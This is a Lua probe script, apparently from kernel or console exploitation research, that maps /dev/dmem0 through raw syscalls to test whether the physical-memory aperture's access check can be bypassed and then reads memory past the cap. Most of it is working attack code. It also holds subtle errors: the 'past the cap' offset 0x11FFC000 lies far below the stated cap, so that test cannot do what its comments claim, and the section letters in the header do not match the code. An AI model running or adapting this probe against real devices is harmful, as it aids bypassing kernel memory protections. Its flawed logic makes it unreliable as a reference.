-- CRASH_CLASS: LOW -- reads only. Maps at offsets that may be refused; never stores.
-- PROBE 1502a: the dmem aperture edge - the lone 0x1000000000 rung, the 0x120000000 cap,
--              and whether a length may run PAST the cap.
--
-- 1410a/1411a/1491a measured the /dev/dmem0 offset space: 0..0x11FFFFFFF is the ACL'd
-- aperture, 0x120000000 answers EACCES, and exactly one 4 KiB rung at 0x1000000000 maps,
-- with prot 1 only. A single hard-coded high offset that bypasses a range check is the
-- classic shape of a truncation or a special case in the admission test. 1491a only ever
-- asked 547 what protection that rung got - it never read a byte of it. Three questions,
-- all read-only:
--
--   [A] baseline: what phys 0 looks like (the C00xxxxx register-init table)
--   [B] the rung: does 0x1000000000 read as phys 0 (an offset-independent admission,
--       i.e. the offset is dropped) or as something else (a real distinct page)?
--       Then walk 0x1000000000 + k*0x1000 for k = 1..7 - if those map, the "rung" is
--       actually the base of a second window and the cap is not where we think.
--   [C] the cap: which offsets above 0x11FFFFFFF map at prot 1 at all
--   [D] the length: mmap offset 0x11FFC000 with len 0x10000 so the range ENDS past the
--       cap. If the pager installs the whole range, 547 reports mapped pages above
--       0x120000000 and the ACL is start-only - then one guarded read there.
--
-- Nothing here writes to the aperture. Reading unmapped device physical space faults
-- inside pcall (42f2 walked 278,528 aperture pages that way and the process survived).
--
-- -- prior art:
--   results/phase36_realargs/1410a_* / 1411a_* (ACL boundary + the lone 0x1000000000 rung)
--   results/phase36_realargs/1412a_* (window accepts only prot 0/1)
--   results/phase36_realargs/1478a_dev_mmap_wrap_ftruncate_20261109_192453.txt (offset+len wrap refused)
--   results/phase36_realargs/1491a_dmem_ro_window_prot_20261109_215915.txt (547 on the rung = prot 1)
--   results/phase36_realargs/1397d_dmem_extent_regs_20261109_142819.txt (4 GiB maps, 0x200000000 EACCES)

print("=== PROBE 1502a: DMEM APERTURE EDGE ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sgn(v)
    local h, l = 0, N(v)
    if type(v) == "table" and v.h then h = N(v.h); l = N(v.l) end
    if h >= 2147483648 then h = h - 4294967296 end
    if h == -1 and l >= 2147483648 then return l - 4294967296 end
    return h * 4294967296 + l
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end
    return nil
end
local function guard16(a, label)
    local o = {}
    for i = 0, 15 do
        local v = rd(a + i * 4)
        if v == nil then o[#o + 1] = "FAULT@" .. string.format("%X", i * 4) break end
        o[#o + 1] = string.format("%08X", v)
    end
    print(string.format("    %s: %s", label, table.concat(o, " ")))
end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

-- SIGSYS ignored so a nosys trampoline is a return value instead of a kill.
local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end

local FD = -1
local rec = memory.alloc(0x40)
local function map547(addr)
    for i = 0, 0x3C, 4 do pcall(function() memory.write_dword(rec + i, uint64(0)) end) end
    local ok, rv = pcall(function() return mk(547)(uint64(addr), uint64(rec), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if not ok then return -999, 0 end
    return sgn(rv), N(memory.read_dword(rec + 0x10))
end

local function dmap(off, len, prot)
    local ok, v = pcall(function()
        return mk(477)(uint64(0), uint64(len), uint64(prot), uint64(1),
                       uint64(FD), uint64(off))
    end)
    if not ok then return -999 end
    return sgn(v)
end
local function dunmap(va, len)
    pcall(function() return mk(73)(uint64(va), uint64(len), uint64(0), uint64(0), uint64(0), uint64(0)) end)
end

-- ---------------------------------------------------------------- [A] descriptor
print("")
print("--- [A] open /dev/dmem0 ---")
do
    local path = "/dev/dmem0"
    local pb = memory.alloc(#path + 2)
    for i = 1, #path do pcall(function() memory.write_byte(pb + i - 1, string.byte(path, i)) end) end
    pcall(function() memory.write_byte(pb + #path, 0) end)
    local ok, v = pcall(function() return mk(5)(uint64(pb), uint64(0x4002), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then FD = sgn(v) end
end
print(string.format("  fd=%d %s", FD, FD < 0 and es() or ""))
if FD < 0 then print("=== PROBE 1502a VOID ===") return end

-- ---------------------------------------------------------------- [B] phys 0 baseline
print("")
print("--- [B] baseline: offset 0, prot 1 ---")
local BASE = dmap(0, 0x4000, 1)
if BASE >= 0 then
    print(string.format("  va=0x%X 547=%d", BASE, map547(BASE)))
    guard16(BASE, "phys 0")
else
    print(string.format("  offset 0 refused rv=%s %s", tostring(BASE), es()))
end

-- ---------------------------------------------------------------- [C] the cap
print("")
print("--- [C] which offsets above the cap map at prot 1 ---")
for _, off in ipairs({0x11FFF0000, 0x11FFC000, 0x11FF0000, 0x120000000,
                      0x140000000, 0x180000000, 0x200000000, 0x400000000, 0x800000000}) do
    local va = dmap(off, 0x1000, 1)
    if va >= 0 then
        print(string.format("  off 0x%X -> 0x%X  547=%d  d0=%08X", off, va, map547(va),
                            rd(va) or 0xDEAD))
        dunmap(va, 0x1000)
    else
        print(string.format("  off 0x%X -> rv=%s %s", off, tostring(va), es()))
    end
end

-- ---------------------------------------------------------------- [D] the rung
print("")
print("--- [D] the 0x1000000000 rung ---")
local RUNG = dmap(0x1000000000, 0x4000, 1)
if RUNG >= 0 then
    print(string.format("  va=0x%X 547=%d", RUNG, map547(RUNG)))
    guard16(RUNG, "rung+0x00")
    if BASE >= 0 then
        local diff = 0
        for i = 0, 15 do
            local a = rd(BASE + i * 4)
            local b = rd(RUNG + i * 4)
            if a ~= nil and b ~= nil and a ~= b then diff = diff + 1 end
        end
        print(string.format("  dwords differing from phys 0: %d of 16 %s", diff,
              diff == 0 and "(SAME as phys 0 - the offset is being dropped)" or "(distinct page)"))
    end
    print("  walking the rung upward (are we at the base of a second window?):")
    for k = 1, 7 do
        local va = dmap(0x1000000000 + k * 0x1000, 0x1000, 1)
        if va >= 0 then
            print(string.format("    +0x%X -> 0x%X 547=%d d0=%08X d1=%08X", k * 0x1000, va,
                                map547(va), rd(va) or 0xDEAD, rd(va + 4) or 0xDEAD))
            dunmap(va, 0x1000)
        else
            print(string.format("    +0x%X -> rv=%s", k * 0x1000, tostring(va)))
        end
    end
else
    print(string.format("  rung refused rv=%s %s", tostring(RUNG), es()))
end

-- ---------------------------------------------------------------- [E] length past the cap
print("")
print("--- [E] length that ends past the cap: off 0x11FFC000 len 0x10000 ---")
local OVER = dmap(0x11FFC000, 0x10000, 1)
if OVER >= 0 then
    print(string.format("  va=0x%X (range 0x11FFC000..0x1200C000)", OVER))
    local past = {}
    for i = 0, 3 do
        local a = OVER + i * 0x4000
        local rv, prot = map547(a)
        print(string.format("    va+0x%X (phys 0x%X) 547 rv=%d prot=%d", i * 0x4000,
                            0x11FFC000 + i * 0x4000, rv, prot))
        if rv == 0 then past[#past + 1] = a end
    end
    -- the pages at or above the cap are the ones the ACL is supposed to refuse
    local above = nil
    for i = 1, 4 do
        local a = OVER + i * 0x4000
        if a >= OVER + 0x4000 and map547(a) == 0 then above = a break end
    end
    if above then
        print(string.format("  a page past the cap is mapped (va 0x%X) - reading it now", above))
        print(string.format("  dwords: %08X %08X %08X %08X", rd(above) or 0xDEAD,
                            rd(above + 4) or 0xDEAD, rd(above + 8) or 0xDEAD,
                            rd(above + 12) or 0xDEAD))
        print("  *** ACL DID NOT BOUND THE RANGE ***")
    else
        print("  547 reports no mapped page past the cap; the range is bounded per page")
    end
else
    print(string.format("  over-cap length refused rv=%s %s", tostring(OVER), es()))
end

local final = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print("")
print(string.format("final canary live: %s (pid %d)", tostring(final == PID), PID))
print("=== PROBE 1502a COMPLETE ===")
